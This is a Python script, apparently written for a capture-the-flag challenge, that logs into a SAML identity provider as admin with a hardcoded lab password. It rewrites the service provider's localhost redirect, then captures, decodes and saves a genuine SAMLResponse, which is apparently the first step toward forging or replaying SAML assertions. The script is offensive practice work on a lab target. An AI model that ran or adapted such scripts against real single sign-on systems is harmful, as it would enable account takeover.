import urllib.request, urllib.parse, http.cookiejar, re, base64, html

IDP = "http://oj-10-30-15-1-58595.adworld.xctf.org.cn"
SP  = "http://oj-10-30-15-1-49263.adworld.xctf.org.cn"

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPRedirectHandler())
op.addheaders = [('User-Agent','Mozilla/5.0')]

def req(u, data=None, redirect=True):
    class NR(urllib.request.HTTPRedirectHandler):
        def redirect_request(self,*a,**k): return None
    o = op if redirect else urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NR())
    r = urllib.request.Request(u, data=data)
    try:
        resp = o.open(r, timeout=25)
        return resp.geturl(), resp.read().decode('utf8','replace')
    except urllib.error.HTTPError as e:
        return e.geturl(), e.read().decode('utf8','replace')

def post(u, d): return req(u, urllib.parse.urlencode(d).encode(), redirect=False)

# admin login
print("login:", req(IDP+"/login")[1][:30])
u,s = post(IDP+"/login", {"username":"admin","password":"RCTF2025"})
print("after login url:", u, "portal?" , "Portal" in s)

# get SAMLRequest from SP
u,s = req(SP+"/saml/login", redirect=False)
print("SP login ->", u)
loc = u
# rewrite 127.0.0.1:80 to IDP host
sso = loc.replace("http://127.0.0.1:80", IDP).replace("http://127.0.0.1", IDP)
print("SSO ->", sso[:120])
u2, s2 = req(sso, redirect=False)
print("SSO resp url:", u2, "len", len(s2))
open("/home/kali/secpt/var/jobs/ab-single-1/ws/sso_out.html","w").write(s2)
m = re.search(r'name="SAMLResponse"\s+value="([^"]+)"', s2)
mn = re.search(r'name="RelayState"\s+value="([^"]*)"', s2)
ma = re.search(r'action="([^"]+)"', s2)
print("SAMLResponse found:", bool(m), "action:", ma.group(1) if ma else None)
if m:
    open("/home/kali/secpt/var/jobs/ab-single-1/ws/real_resp.b64","w").write(m.group(1))
    print(base64.b64decode(m.group(1)).decode('utf8','replace')[:1500])
